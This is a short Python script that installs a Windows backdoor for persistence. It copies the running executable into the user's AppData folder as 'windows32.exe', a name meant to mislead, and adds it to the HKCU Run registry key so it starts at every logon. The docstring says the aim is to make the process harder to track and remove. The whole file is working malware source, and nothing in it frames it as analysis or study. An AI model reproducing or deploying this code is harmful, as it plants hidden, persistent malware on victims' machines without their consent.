#!/usr/bin/env python3
"""backdoor"""
from os import environ, path
from shutil import copyfile
from subprocess import call
from sys import executable


def backdoor() -> None:
    """Add a harder to track and remove constant running process"""
    location = f'{environ["appdata"]}\\windows32.exe'
    if not path.exists(location):
        copyfile(executable, location)
        call(
            f"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\"
            f"Run /v Backdoor /t REG_SZ /d {location}",
            shell=True,
        )
